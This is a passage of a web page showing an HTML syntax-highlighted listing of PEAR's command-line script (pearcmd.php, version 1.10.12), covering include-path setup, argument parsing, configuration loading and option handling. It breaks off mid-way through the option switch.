class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * PEAR, the PHP Extension and Application Repository</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Command line interface</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * PHP versions 4 and 5</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@category</span>  pear</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@package</span>   PEAR</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>    Stig Bakken &lt;ssb<span class="hljs-doctag">@php</span>.net&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>    Tomas V.V.Cox &lt;cox<span class="hljs-doctag">@idecnet</span>.com&gt;</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@copyright</span> 1997-2009 The Authors</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@license</span>   http://opensource.org/licenses/bsd-license.php New BSD License</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@link</span>      http://pear.php.net/package/PEAR</span><br><span class="hljs-comment"> */</span><br><br>@<span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">defined</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>)) &#123;<br>    <span class="hljs-comment">// this is defined in peclcmd.php as &#x27;pecl&#x27;</span><br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_RUNTYPE&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;PEAR_IGNORE_BACKTRACE&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@nodep</span> Gtk</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">//the space is needed for windows include paths with trailing backslash</span><br><span class="hljs-comment">// http://pear.php.net/bugs/bug.php?id=19482</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;/usr/local/lib/php &#x27;</span> != <span class="hljs-string">&#x27;@&#x27;</span>.<span class="hljs-string">&#x27;include_path&#x27;</span>.<span class="hljs-string">&#x27;@ &#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-string">&#x27;/usr/local/lib/php &#x27;</span>). PATH_SEPARATOR .  <span class="hljs-title function_ invoke__">get_include_path</span>());<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">false</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// this is a raw, uninstalled pear, either a cvs checkout, or php distro</span><br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;include_path&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__DIR__</span>) . PATH_SEPARATOR . <span class="hljs-title function_ invoke__">get_include_path</span>());<br>    <span class="hljs-variable">$raw</span> = <span class="hljs-literal">true</span>;<br>&#125;<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;allow_url_fopen&#x27;</span>, <span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ob_implicit_flush</span>(<span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;track_errors&#x27;</span>, <span class="hljs-literal">true</span>);<br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;html_errors&#x27;</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-variable">$_PEAR_PHPDIR</span> = <span class="hljs-string">&#x27;#$%^&amp;*&#x27;</span>;<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&#x27;error_handler&#x27;</span>);<br><br><span class="hljs-variable">$pear_package_version</span> = <span class="hljs-string">&quot;1.10.12&quot;</span>;<br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Frontend.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Config.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;PEAR/Command.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Console/Getopt.php&#x27;</span>;<br><br><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">&#x27;CLI&#x27;</span>);<br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-comment">// remove this next part when we stop supporting that crap-ass PHP 4.2</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$HTTP_SERVER_VARS</span>[<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .<br>         <span class="hljs-string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">&#x27;cli&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>&#125;<br><span class="hljs-variable">$progname</span> = PEAR_RUNTYPE;<br><span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$argv</span>);<br><span class="hljs-variable">$options</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">getopt2</span>(<span class="hljs-variable">$argv</span>, <span class="hljs-string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);<br><span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$options</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">usage</span>(<span class="hljs-variable">$options</span>);<br>&#125;<br><br><span class="hljs-variable">$opts</span> = <span class="hljs-variable">$options</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;CLI&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$progname</span> == <span class="hljs-string">&#x27;gpear&#x27;</span> || <span class="hljs-variable">$progname</span> == <span class="hljs-string">&#x27;pear-gtk&#x27;</span>) &#123;<br>    <span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;Gtk2&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;G&#x27;</span>) &#123;<br>            <span class="hljs-variable">$fetype</span> = <span class="hljs-string">&#x27;Gtk2&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$pear_user_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$pear_system_config</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$store_user_config</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$store_system_config</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$verbose</span> = <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>        <span class="hljs-variable">$pear_user_config</span> = <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>        <span class="hljs-variable">$pear_system_config</span> = <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-variable">$fetype</span>);<br><span class="hljs-variable">$ui</span> = &amp;<span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getFrontendObject</span>();<br><span class="hljs-variable">$config</span> = &amp;<span class="hljs-title class_">PEAR_Config</span>::<span class="hljs-title function_ invoke__">singleton</span>(<span class="hljs-variable">$pear_user_config</span>, <span class="hljs-variable">$pear_system_config</span>);<br><br><span class="hljs-keyword">if</span> (PEAR::<span class="hljs-title function_ invoke__">isError</span>(<span class="hljs-variable">$config</span>)) &#123;<br>    <span class="hljs-variable">$_file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pear_user_config</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$_file</span> .= <span class="hljs-variable">$pear_user_config</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pear_system_config</span> !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$_file</span> .= <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$pear_system_config</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_file</span> == <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>        <span class="hljs-variable">$_file</span> = <span class="hljs-string">&#x27;The default config file&#x27;</span>;<br>    &#125;<br>    <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    <span class="hljs-variable">$ui</span>-&gt;<span class="hljs-title function_ invoke__">outputData</span>(<span class="hljs-string">&quot;ERROR: <span class="hljs-subst">$_file</span> is not a valid config file or is corrupted.&quot;</span>);<br>    <span class="hljs-comment">// We stop, we have no idea where we are :)</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// this is used in the error handler to retrieve a relative path</span><br><span class="hljs-variable">$_PEAR_PHPDIR</span> = <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;php_dir&#x27;</span>);<br><span class="hljs-variable">$ui</span>-&gt;<span class="hljs-title function_ invoke__">setConfig</span>(<span class="hljs-variable">$config</span>);<br>PEAR::<span class="hljs-title function_ invoke__">setErrorHandling</span>(PEAR_ERROR_CALLBACK, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$ui</span>, <span class="hljs-string">&quot;displayFatalError&quot;</span>));<br><br><span class="hljs-variable">$verbose</span> = <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&quot;verbose&quot;</span>);<br><span class="hljs-variable">$cmdopts</span> = <span class="hljs-keyword">array</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$raw</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">isDefinedLayer</span>(<span class="hljs-string">&#x27;user&#x27;</span>) &amp;&amp; !<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">isDefinedLayer</span>(<span class="hljs-string">&#x27;system&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$found</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;d&#x27;</span> || <span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;D&#x27;</span>) &#123;<br>                <span class="hljs-comment">// the user knows what they are doing, and are setting config values</span><br>                <span class="hljs-variable">$found</span> = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$found</span>) &#123;<br>            <span class="hljs-comment">// no prior runs, try to install PEAR</span><br>            <span class="hljs-variable">$parent</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$parent</span>, <span class="hljs-string">&#x27;scripts&#x27;</span>)) &#123;<br>                <span class="hljs-variable">$grandparent</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$parent</span>);<br>                <span class="hljs-variable">$packagexml</span> = <span class="hljs-variable">$grandparent</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;package2.xml&#x27;</span>;<br>                <span class="hljs-variable">$pearbase</span> = <span class="hljs-variable">$grandparent</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$packagexml</span> = <span class="hljs-variable">$parent</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;package2.xml&#x27;</span>;<br>                <span class="hljs-variable">$pearbase</span> = <span class="hljs-variable">$parent</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$packagexml</span>)) &#123;<br>                <span class="hljs-variable">$options</span>[<span class="hljs-number">1</span>] = <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&#x27;install&#x27;</span>,<br>                    <span class="hljs-variable">$packagexml</span><br>                );<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;php_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;php&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;data_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;data&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;doc_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;docs&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;test_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;tests&#x27;</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<br>                    <span class="hljs-string">&#x27;ext_dir&#x27;</span>,<br>                    <span class="hljs-variable">$pearbase</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">&#x27;extensions&#x27;</span><br>                );<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;bin_dir&#x27;</span>, <span class="hljs-variable">$pearbase</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">mergeConfigFile</span>(<span class="hljs-variable">$pearbase</span> . <span class="hljs-string">&#x27;pear.ini&#x27;</span>, <span class="hljs-literal">false</span>);<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">store</span>();<br>                <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;auto_discover&#x27;</span>, <span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$opts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$opt</span>) &#123;<br>    <span class="hljs-variable">$param</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>]) ? <span class="hljs-variable">$opt</span>[<span class="hljs-number">1</span>] : <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$opt</span>[<span class="hljs-number">0</span>]) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected -d config_value=value, &#x27;</span> .<br>                <span class="hljs-string">&#x27;received &quot;-d&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-variable">$possible</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$possible</span>) != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;&#x27;</span> . <span class="hljs-variable">$param</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$param</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;-d&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-variable">$possible</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$possible</span>) != <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<br>                <span class="hljs-string">&#x27;Invalid usage of &quot;-d&quot; option, expected &#x27;</span> .<br>                <span class="hljs-string">&#x27;-d config_value=value, received &quot;&#x27;</span> . <span class="hljs-variable">$param</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span><br>            );<br>        &#125;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-variable">$param</span>);<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-string">&#x27;system&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>        <span class="hljs-variable">$store_user_config</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:<br>        <span class="hljs-variable">$store_system_config</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;u&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$param</span>, <span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>, <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>) + <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>        <span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&#x27;verbose&#x27;</span>, <span class="hljs-variable">$config</span>-&gt;<span 